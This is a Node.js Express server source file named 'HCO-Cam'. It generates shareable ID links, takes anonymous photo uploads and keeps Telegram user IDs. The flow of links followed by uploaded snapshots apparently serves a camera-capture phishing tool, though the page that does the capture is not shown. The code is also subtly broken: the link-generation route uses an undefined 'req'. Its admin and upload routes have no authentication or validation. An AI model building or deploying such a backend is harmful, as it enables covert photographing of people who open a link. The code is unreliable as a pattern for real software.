const express = require("express");
const multer = require("multer");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const PORT = process.env.PORT || 3000;

// ===== DB =====
const db = new sqlite3.Database("./data.db");
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telegram_id TEXT UNIQUE,
    joined_at TEXT
  )`);
  db.run(`CREATE TABLE IF NOT EXISTS photos (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    filename TEXT,
    uploaded_at TEXT
  )`);
});

// ===== Middleware =====
app.use(express.json());
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

// ===== Upload =====
const storage = multer.diskStorage({
  destination: "uploads/",
  filename: (_, file, cb) => {
    cb(null, uuidv4() + ".jpg");
  }
});
const upload = multer({ storage });

// ===== Routes =====
app.get("/", (_, res) => {
  res.sendFile(path.join(__dirname, "public/index.html"));
});

// Register user
app.post("/api/register", (req, res) => {
  const { telegram_id } = req.body;
  if (!telegram_id) return res.sendStatus(400);

  db.run(
    `INSERT OR IGNORE INTO users (telegram_id, joined_at)
     VALUES (?, datetime('now'))`,
    [telegram_id]
  );
  res.json({ ok: true });
});

// Generate link
app.post("/api/generate", (_, res) => {
  const id = uuidv4();
  res.json({ link: `${reqProtocol(req)}://${reqHost(req)}/?id=${id}` });
});

// Upload photo
app.post("/api/upload", upload.single("photo"), (req, res) => {
  db.run(
    `INSERT INTO photos (filename, uploaded_at)
     VALUES (?, datetime('now'))`,
    [req.file.filename]
  );
  res.json({ success: true });
});

// Admin stats
app.get("/api/admin/stats", (_, res) => {
  db.get(`SELECT COUNT(*) users FROM users`, (_, u) => {
    db.get(`SELECT COUNT(*) photos FROM photos`, (_, p) => {
      res.json({ users: u.users, photos: p.photos });
    });
  });
});

// User list
app.get("/api/admin/users", (_, res) => {
  db.all(`SELECT telegram_id, joined_at FROM users ORDER BY id DESC`, (_, rows) => {
    res.json(rows);
  });
});

// Helpers
function reqProtocol(req){ return req.headers["x-forwarded-proto"] || "http"; }
function reqHost(req){ return req.headers.host; }

app.listen(PORT, () => {
  console.log(`🚀 HCO-Cam Server Started on ${PORT}`);
});
